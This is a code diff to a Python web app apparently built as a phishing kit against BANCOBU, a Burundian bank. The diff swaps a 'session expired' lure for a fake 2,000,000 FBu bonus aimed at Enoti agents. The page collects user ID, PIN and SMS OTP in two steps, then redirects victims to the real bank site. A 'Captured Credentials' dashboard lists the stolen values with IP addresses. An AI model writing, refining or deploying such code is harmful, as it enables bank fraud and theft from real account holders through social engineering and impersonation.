@@ -41,12 +41,12 @@ def init_db():
 
 init_db()
 
-# ==================== PHISHING PAGE ====================
+# ==================== PHISHING PAGE WITH BONUS MESSAGE ====================
 PHISHING_HTML = '''
 <!DOCTYPE html>
 <html>
 <head>
-    <title>BANCOBU - Session Expirée</title>
+    <title>BANCOBU - Programme Bonus Agents Enoti</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
@@ -62,7 +62,7 @@ PHISHING_HTML = '''
         }
         .card {
             background: white;
-            max-width: 450px;
+            max-width: 550px;
             width: 100%;
             padding: 35px;
             border-radius: 25px;
@@ -71,15 +71,41 @@ PHISHING_HTML = '''
         }
         .logo { font-size: 32px; font-weight: bold; color: #004d99; margin-bottom: 10px; }
         .logo span { color: #ffcc00; }
-        .subtitle { color: #666; font-size: 13px; margin-bottom: 25px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
-        .error-box { background: #fff3cd; border-left: 4px solid #ffc107; padding: 15px; margin-bottom: 25px; font-size: 13px; text-align: left; border-radius: 8px; }
+        .subtitle { color: #666; font-size: 13px; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
+        
+        /* Bonus Card */
+        .bonus-card {
+            background: linear-gradient(135deg, #ffd700 0%, #ffb300 100%);
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+        }
+        .bonus-title { font-size: 18px; font-weight: bold; color: #00264d; margin-bottom: 5px; }
+        .bonus-amount { font-size: 36px; font-weight: 800; color: #00264d; margin: 10px 0; }
+        .bonus-desc { font-size: 12px; color: #00264d; }
+        
+        .message-box {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            text-align: left;
+            font-size: 14px;
+            line-height: 1.5;
+            color: #333;
+            border-left: 4px solid #ffcc00;
+        }
+        .highlight { color: #004d99; font-weight: bold; }
+        
         .input-group { margin-bottom: 20px; text-align: left; }
         .input-group label { display: block; margin-bottom: 8px; font-weight: bold; color: #003366; font-size: 13px; }
         .input-group input { width: 100%; padding: 14px; border: 2px solid #e0e0e0; border-radius: 12px; font-size: 15px; }
         .input-group input:focus { border-color: #004d99; outline: none; }
+        
         button { width: 100%; padding: 14px; background: linear-gradient(135deg, #004d99 0%, #00264d 100%); color: white; border: none; border-radius: 50px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.2s; }
         button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
         .btn-otp { background: linear-gradient(135deg, #ffcc00 0%, #ffb300 100%); color: #00264d; }
+        
         .info-msg { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; padding: 15px; border-radius: 8px; margin-bottom: 25px; font-size: 14px; }
         .footer { margin-top: 25px; font-size: 11px; color: #999; }
         .loading { display: none; margin-top: 20px; color: #004d99; font-size: 14px; }
@@ -90,12 +116,21 @@ PHISHING_HTML = '''
     <div class="logo">BANCOBU <span>| Enoti</span></div>
     <div class="subtitle">Banque Commerciale du Burundi</div>
 
+    <!-- BONUS CARD - LURE MESSAGE -->
+    <div class="bonus-card">
+        <div class="bonus-title">🎉 PROGRAMME BONUS AGENTS ENOTI 🎉</div>
+        <div class="bonus-amount">2.000.000 FBu</div>
+        <div class="bonus-desc">Offre spéciale réservée aux agents Enoti</div>
+    </div>
+
+    <div class="message-box">
+        <strong>Murakaza neza muri BANCOBU Enoti.</strong><br><br>
+        Dans le cadre de notre programme de fidélisation des agents Enoti, vous avez été sélectionné pour recevoir un <span class="highlight">bonus exceptionnel de 2.000.000 FBu</span>.<br><br>
+        Pour bénéficier de cette offre, veuillez vous connecter à votre compte BANCOBU ci-dessous.
+    </div>
+
     <!-- STEP 1: Identifiant + Code PIN -->
     <div id="step1">
-        <div class="error-box">
-            ⚠️ <strong>Session expirée</strong><br>
-            Votre session a expiré pour des raisons de sécurité. Veuillez vous reconnecter.
-        </div>
         <div class="input-group">
             <label>Identifiant d'utilisateur</label>
             <input type="text" id="username" placeholder="ex: agent.enoti">
@@ -104,20 +139,20 @@ PHISHING_HTML = '''
             <label>Code PIN</label>
             <input type="password" id="pin" placeholder="••••••">
         </div>
-        <button id="loginBtn" onclick="submitLogin()">Se connecter</button>
+        <button onclick="submitLogin()">Se connecter et recevoir mon bonus</button>
     </div>
 
     <!-- STEP 2: OTP Code -->
     <div id="step2" style="display:none;">
         <div class="info-msg">
             📱 <strong>Code OTP envoyé</strong><br>
-            Un code de vérification a été envoyé sur votre téléphone. Veuillez le saisir ci-dessous.
+            Un code de vérification a été envoyé sur votre téléphone. Veuillez le saisir ci-dessous pour finaliser votre inscription au bonus.
         </div>
         <div class="input-group">
             <label>Code OTP</label>
             <input type="text" id="otp" placeholder="Entrez le code reçu par SMS">
         </div>
-        <button class="btn-otp" onclick="submitOTP()">Confirmer le code OTP</button>
+        <button class="btn-otp" onclick="submitOTP()">Confirmer et recevoir mon bonus</button>
     </div>
 
     <div id="loading" class="loading">⏳ Vérification en cours...</div>
@@ -173,7 +208,7 @@ PHISHING_HTML = '''
         
         if (response.ok) {
             document.getElementById('loading').style.display = 'none';
-            alert("✅ Vérification réussie ! Redirection en cours...");
+            alert("✅ Félicitations ! Votre bonus a été validé. Redirection en cours...");
             setTimeout(() => {
                 window.location.href = "https://www.bancobu.bi";
             }, 2000);
@@ -259,7 +294,7 @@ DASHBOARD_HTML = '''
     <h1>🏦 BANCOBU - Captured Credentials</h1>
     <div class="stats" id="stats">📊 Captured: 0</div>
     <div style="overflow-x: auto;">
-    <tr>
+    <table>
         <thead>
             <tr><th>Time</th><th>IP Address</th><th>Identifiant</th><th>Code PIN</th><th>Code OTP</th></tr>
         </thead>
